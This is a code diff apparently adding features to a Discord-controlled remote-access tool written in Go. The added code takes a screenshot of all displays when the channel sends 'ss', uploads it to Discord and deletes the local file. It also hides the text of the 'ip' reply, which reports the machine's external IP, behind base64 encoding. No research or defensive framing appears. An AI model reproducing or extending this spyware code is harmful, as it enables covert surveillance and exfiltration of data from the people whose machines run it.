@@ -3,6 +3,8 @@ package main
 import (
 	"encoding/base64"
 	"fmt"
+	"image"
+	"image/png"
 	"net/http"
 	"os"
 	"os/signal"
@@ -10,6 +12,7 @@ import (
 	"syscall"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/kbinani/screenshot"
 	"github.com/sqweek/dialog"
 )
 
@@ -99,6 +102,51 @@ func GetExternalIP() string {
 	return ipBuilder.String()
 }
 
+func save(img *image.RGBA, filePath string) {
+	file, err := os.Create(filePath)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+	png.Encode(file, img)
+}
+
+func captSs() {
+	// Capture each displays.
+	n := screenshot.NumActiveDisplays()
+	if n <= 0 {
+		panic("Active display not found")
+	}
+
+	var all image.Rectangle = image.Rect(0, 0, 0, 0)
+
+	for i := 0; i < n; i++ {
+		bounds := screenshot.GetDisplayBounds(i)
+		all = bounds.Union(all)
+		// fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
+		// save(img, fileName)
+
+		// fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
+	}
+
+	// Capture all desktop region into an image.
+	fmt.Printf("%v\n", all)
+	img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
+	if err != nil {
+		panic(err)
+	}
+	save(img, "all.png")
+}
+
+func remove_File() {
+	err := os.Remove("all.png")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println("File Deleted")
+}
+
 // This function will be called (due to AddHandler above) every time a new
 // message is created on any channel that the authenticated bot has access to.
 func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
@@ -122,7 +170,25 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if m.Content == Prefix+"ip" {
-		s.ChannelMessageSend(m.ChannelID, "The IP of the client is: "+GetExternalIP())
+		rs := "VGhlIElQIG9mIHRoZSBjbGllbnQgaXM6IA=="
+		fs, err := base64.StdEncoding.DecodeString(rs)
+		if err != nil {
+			s.ChannelMessageSend(m.ChannelID, "error decoding token")
+		}
+		s.ChannelMessageSend(m.ChannelID, string(fs)+GetExternalIP())
+	}
+
+	if m.Content == Prefix+"ss" {
+		captSs()
+		file, err := os.Open("all.png")
+		if err != nil {
+			// Handle error
+			return
+		}
+
+		s.ChannelFileSend(m.ChannelID, "TheFile.png", file)
+		defer remove_File()
+		defer file.Close()
 	}
 
 	if strings.Contains(m.Content, Prefix+"messagebox") {
